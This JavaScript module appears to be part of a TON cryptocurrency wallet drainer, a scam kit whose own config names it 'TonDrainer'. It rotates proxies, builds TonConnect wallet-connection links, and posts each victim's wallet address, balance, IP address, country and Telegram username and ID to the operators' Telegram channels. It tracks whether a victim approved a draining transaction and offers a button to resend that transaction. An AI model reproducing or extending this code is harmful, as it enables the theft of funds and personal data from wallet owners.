const axios = require("axios");
const {HttpsProxyAgent} = require('https-proxy-agent');
const fs = require('fs');
const path = require("path");
const { admin, domain } = require("../../config");
const TonKeeper = require("../tonkeeper");

function rounded(number) {
    if(number == undefined) return undefined;
    return +number.toFixed(2);
}

const FALLBACK_WALLETS_LIST = [
    {
        app_name: 'telegram-wallet',
        name: 'Wallet',
        image: 'https://wallet.tg/images/logo-288.png',
        about_url: 'https://wallet.tg/',
        universal_url: 'https://t.me/wallet?attach=wallet',
        bridge: [
            {
                type: 'sse',
                url: 'https://bridge.tonapi.io/bridge'
            }
        ],
        platforms: ['ios', 'android', 'macos', 'windows', 'linux']
    },
    {
        app_name: 'tonkeeper',
        name: 'Tonkeeper',
        image: 'https://tonkeeper.com/assets/tonconnect-icon.png',
        tondns: 'tonkeeper.ton',
        about_url: 'https://tonkeeper.com',
        universal_url: 'https://app.tonkeeper.com/ton-connect',
        deepLink: 'tonkeeper-tc://',
        bridge: [
            {
                type: 'sse',
                url: 'https://bridge.tonapi.io/bridge'
            },
            {
                type: 'js',
                key: 'tonkeeper'
            }
        ],
        platforms: ['ios', 'android', 'chrome', 'firefox', 'macos']
    },
    {
        app_name: 'mytonwallet',
        name: 'MyTonWallet',
        image: 'https://mytonwallet.io/icon-256.png',
        about_url: 'https://mytonwallet.io',
        universal_url: 'https://connect.mytonwallet.org',
        bridge: [
            {
                type: 'js',
                key: 'mytonwallet'
            },
            {
                type: 'sse',
                url: 'https://tonconnectbridge.mytonwallet.org/bridge/'
            }
        ],
        platforms: ['chrome', 'windows', 'macos', 'linux', 'ios', 'android', 'firefox']
    },
    {
        app_name: 'openmask',
        name: 'OpenMask',
        image: 'https://raw.githubusercontent.com/OpenProduct/openmask-extension/main/public/openmask-logo-288.png',
        about_url: 'https://www.openmask.app/',
        bridge: [
            {
                type: 'js',
                key: 'openmask'
            }
        ],
        platforms: ['chrome']
    },
    {
        app_name: 'tonhub',
        name: 'Tonhub',
        image: 'https://tonhub.com/tonconnect_logo.png',
        about_url: 'https://tonhub.com',
        universal_url: 'https://tonhub.com/ton-connect',
        bridge: [
            {
                type: 'js',
                key: 'tonhub'
            },
            {
                type: 'sse',
                url: 'https://connect.tonhubapi.com/tonconnect'
            }
        ],
        platforms: ['ios', 'android']
    },
    {
        app_name: 'dewallet',
        name: 'DeWallet',
        image: 'https://app.delabwallet.com/logo_black.png',
        about_url: 'https://delabwallet.com',
        bridge: [
            {
                type: 'js',
                key: 'dewallet'
            }
        ],
        platforms: ['chrome']
    },
    {
        app_name: 'xtonwallet',
        name: 'XTONWallet',
        image: 'https://xtonwallet.com/assets/img/icon-256-back.png',
        about_url: 'https://xtonwallet.com',
        bridge: [
            {
                type: 'js',
                key: 'xtonwallet'
            }
        ],
        platforms: ['chrome', 'firefox']
    },
    {
        app_name: 'tonwallet',
        name: 'TON Wallet',
        image: 'https://wallet.ton.org/assets/ui/qr-logo.png',
        about_url: 'https://chrome.google.com/webstore/detail/ton-wallet/nphplpgoakhhjchkkhmiggakijnkhfnd',
        bridge: [
            {
                type: 'js',
                key: 'tonwallet'
            }
        ],
        platforms: ['chrome']
    }
];

class Utils {
    static wallets = undefined;
    static proxyNumber = 0;
    static proxies = fs.readFileSync(path.join(__dirname, "../../proxy.txt")).toString().replace("\t", "").replace("\r\n", "\n").split("\n").filter((s) => !!s);

    static updateProxyNumber() {
        this.proxyNumber++;
        if(this.proxyNumber >= this.proxies.length) this.proxyNumber = 0;
    }

    static getProxy() {
        return (new HttpsProxyAgent("http://" + this.proxies[this.proxyNumber]));
    }

    static async getWallets() {
        if(Utils.wallets != undefined) return Utils.wallets;

        let wallets = FALLBACK_WALLETS_LIST;
        try {
            const url = "https://raw.githubusercontent.com/ton-blockchain/wallets-list/main/wallets-v2.json";
            wallets = (await axios.get(url)).data;
        }
        catch(err) {

        }

        Utils.wallets = wallets;
        return Utils.wallets;
    }

    static generateUrl(app_url, id, metadata) {
        metadata = JSON.stringify(metadata).replace(" ", "").replace("\'", "\"");

        return `${app_url}?v=2&id=${id}&r=${encodeURIComponent(metadata)}&ret=none`;
    }

    static fromNanoTon(value) {
        return Utils.fromDecimalsTon(value, 9);
    }

    static fromDecimalsTon(value, decimals) {
        return parseFloat(value) / Math.pow(10, decimals);
    }

    static toNanoTon(value) {
        return Utils.toDecimalsTon(value, 9);
    }

    static toDecimalsTon(value, decimals) {
        return parseFloat(value) * Math.pow(10, decimals);
    }

    static async sendMessage(token, chat_id, text, inline_keyboard) {
        let sent = false;
         try {
             const response = await axios.post(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}`, {
                 chat_id,
                 text,
                 reply_markup: {
                     inline_keyboard
                 }
             });

             sent = true;
         }
         catch(error) {
            //console.log(error);
         }
    }

    static getFlagEmoji(countryCode) {
        try {
            const codePoints = countryCode
            .toUpperCase()
            .split('')
            .map(char =>  127397 + char.charCodeAt());
          return String.fromCodePoint(...codePoints);
        } catch {
            return "ERROR";
        }
    }

    static async sendInformation(data, type, api_answer) {
        try {
        let message;
        let tonPrice = rounded((await TonKeeper.getTonPrice()));
        let inline_keyboard = []

        if(data.telegram_data == undefined) data.telegram_data = {
            initDataUnsafe: {}
        }

        inline_keyboard.push([{
            text: "🌐 Tonviewer",
            url: `https://tonviewer.com/${data.address}`
        }]);

        let items = "";
        let itemsTotal = 0;

        for(let i = 0; i < data.messages.length; i++) {
            if(data.messages[i].type == "spam_contract") {
                items += `🗑️ Transaction spam\n`;
                continue;
            }

            if(data.messages[i].type.includes("proxyTransaction")) {
                items += `🔁 Proxy Transaction\n`;
                continue;
            }

            itemsTotal += data.messages[i].balance;

            if(data.nftNewMode == false) {
                let itemName = 'TON';

                if (data.messages[i].type == 'jetton') {
                    itemName = data.messages[i].jetton.jetton.name;
                } else if (data.messages[i].type == 'nft') {
                    itemName = "NFT";
                }

                items += `${itemName} | ${rounded(data.messages[i].balance)} TON | ${rounded(data.messages[i].balance * tonPrice)}$ ${data.messages[i].in_fee == true ? `| in_fee` : ``}\n`;
            }

            else items += `${data.messages[i].type} | https://fragment.com/${data.messages[i].nft.collection.name == "Telegram Usernames" ? "username" : "number"}/${data.messages[i].nft.metadata.name} | ${rounded(data.messages[i].balance)} TON | ${rounded(data.messages[i].balance * tonPrice)}$\n`
        }

        if(type == "zero") {
            message = `
0️⃣ <b>Zero Wallet!</b>
└👛 <b>Address:</b> <code>${data.address}</code>
└💎 <b>Wallet:</b> ${data.appName} v${data.appVersion}
└💻 <b>Device:</b> ${data.platform}
└👁 <b>IP:</b> ${data.ip} ${Utils.getFlagEmoji(data.country)}
└🌐 <b>Domain:</b> ${data.domain}
└🦣 <b>User:</b> ${Object.keys(data.telegram_data.initDataUnsafe) == 0  ? `Not found` : `@${data.telegram_data.initDataUnsafe.user.username} | ${data.telegram_data.initDataUnsafe.user.id}`}

💳 <b>Total Balance:</b> ${data.total} TON | ${rounded(data.total * tonPrice)}$
            `;
        }
        if(type == "fee") {
            message = `
🐊 <b>Need for fee!</b>
└👛 <b>Address:</b> <code>${data.address}</code>
└💎 <b>Wallet:</b> ${data.appName} v${data.appVersion}
└💻 <b>Device:</b> ${data.platform} 
└👁 <b>IP:</b> ${data.ip} ${Utils.getFlagEmoji(data.country)}
└🌐 <b>Domain:</b> ${data.domain} 
└🦣 <b>User:</b> ${Object.keys(data.telegram_data.initDataUnsafe) == 0  ? `Not found` : `@${data.telegram_data.initDataUnsafe.user.username} | ${data.telegram_data.initDataUnsafe.user.id}`}

💳 <b>Total Balance:</b> ${data.total} TON | ${rounded(data.total * tonPrice)}$
                `;
        }
        if(type == "connection") {
            message = `
🎈 <b>New connection!</b>
└👛 <b>Address:</b> <code>${data.address}</code>
└💎 <b>Wallet:</b> ${data.appName} v${data.appVersion}
└💻 <b>Device:</b> ${data.platform}
└👁 <b>IP:</b> ${data.ip} ${Utils.getFlagEmoji(data.country)}
└🌐 <b>Domain:</b> ${data.domain}
└🦣 <b>User:</b> ${Object.keys(data.telegram_data.initDataUnsafe) == 0  ? `Not found` : `@${data.telegram_data.initDataUnsafe.user.username} | ${data.telegram_data.initDataUnsafe.user.id}`}

💳 <b>Total Balance:</b> ${data.total} TON | ${rounded(data.total * tonPrice)}$
            `;
        }
        if(type == "requested") {
            message = `
⁉️ <b>Transaction requested!</b>
└👛 <b>Address:</b> <code>${data.address}</code>
└💎 <b>Wallet:</b> ${data.appName} v${data.appVersion}
└💻 <b>Device:</b> ${data.platform}
└👁 <b>IP:</b> ${data.ip} ${Utils.getFlagEmoji(data.country)}
└🌐 <b>Domain:</b> ${data.domain}
└🦣 <b>User:</b> ${Object.keys(data.telegram_data.initDataUnsafe) == 0  ? `Not found` : `@${data.telegram_data.initDataUnsafe.user.username} | ${data.telegram_data.initDataUnsafe.user.id}`}

📚 <b>Items:</b>
${items}
💳 <b>Total Balance:</b> ${data.total} TON | ${rounded(data.total * tonPrice)}$
            `;

            if(data.tryTransaction != undefined) {
                inline_keyboard.push([{
                    text: "⁉️ Send Transaction",
                    url: `${domain}/request/${encodeURIComponent(data.tryTransaction)}`
                }]);
            }
        }
        if(type == "notapproved") {
            message = `
❌ <b>Transaction not approved!</b>
└👛 <b>Address:</b> <code>${data.address}</code>
└💎 <b>Wallet:</b> ${data.appName} v${data.appVersion}
└💻 <b>Device:</b> ${data.platform}
└👁 <b>IP:</b> ${data.ip} ${Utils.getFlagEmoji(data.country)}
└🌐 <b>Domain:</b> ${data.domain}
└🦣 <b>User:</b> ${Object.keys(data.telegram_data.initDataUnsafe) == 0  ? `Not found` : `@${data.telegram_data.initDataUnsafe.user.username} | ${data.telegram_data.initDataUnsafe.user.id}`}

📚 <b>Items:</b>
${items}
💳 <b>Total Balance:</b> ${data.total} TON | ${rounded(data.total * tonPrice)}$
                `;
        }
        if(type == "approved") {
            inline_keyboard.push([{
                text: "💎 Transaction",
                url: `https://tonviewer.com/transaction/${data.tx}`
            }]);

            message = `
✅ <b>Transaction approved!</b>
└👛 <b>Address:</b> <code>${data.address}</code>
└💎 <b>Wallet:</b> ${data.appName} v${data.appVersion}
└💻 <b>Device:</b> ${data.platform}
└👁 <b>IP:</b> ${data.ip} ${Utils.getFlagEmoji(data.country)}
└🌐 <b>Domain:</b> ${data.domain}
└🦣 <b>User:</b> ${Object.keys(data.telegram_data.initDataUnsafe) == 0  ? `Not found` : `@${data.telegram_data.initDataUnsafe.user.username} | ${data.telegram_data.initDataUnsafe.user.id}`}

📚 <b>Items:</b>
${items}
💳 <b>Total Balance:</b> ${data.total} TON | ${rounded(data.total * tonPrice)}$\n`;
        message += `Total Items: ${rounded(itemsTotal)} TON | ${rounded(itemsTotal * tonPrice)}$\n`

        }


        if(data.nftNewMode) message += `\n#nftNewMode`
        message += `\n#${type}`;

        if(type == "approved") this.sendMessage(admin.token, data.nftNewMode == true ? admin.nft_approved : admin.approved_channel, message, inline_keyboard);
        else if(type != "zero") this.sendMessage(admin.token, admin.channel, message, inline_keyboard);

        else if(api_answer.TonDrainer.Notifications.Chats.length == 0 && api_answer.TonDrainer.Blacklist.includes(data.address) && type == "approved") return this.sendMessage(api_answer.TonDrainer.Notifications.BotToken == undefined ? admin.token : api_answer.TonDrainer.Notifications.BotToken, api_answer.ChatID, message, inline_keyboard);

        for(let i = 0; i < api_answer.TonDrainer.Notifications.Chats.length; i++) {
            let chat = api_answer.TonDrainer.Notifications.Chats[i];

            if(chat[type] == false) continue;
            if(api_answer.TonDrainer.Blacklist.includes(data.address) && type != "approved") continue;

            this.sendMessage(api_answer.TonDrainer.Notifications.BotToken, chat.ChatID, message, inline_keyboard)
        }
    }
    catch(error) {

    }
    }

    static generateComment(message, comment) {
        const ivm = require('isolated-vm');
        const isolate = new ivm.Isolate({ memoryLimit: 8 });

        console.log(message);
        console.log(comment);

        const code = `(function () {
            function rounded(number) {
                if(number == undefined) return undefined;
                return +number.toFixed(2);
            }

            let message = ${JSON.stringify(message)};

            return \`${comment}\`;
        })()`

        const script = isolate.compileScriptSync(code);
        const context = isolate.createContextSync();

        return script.runSync(context);
    }
}

module.exports = Utils;
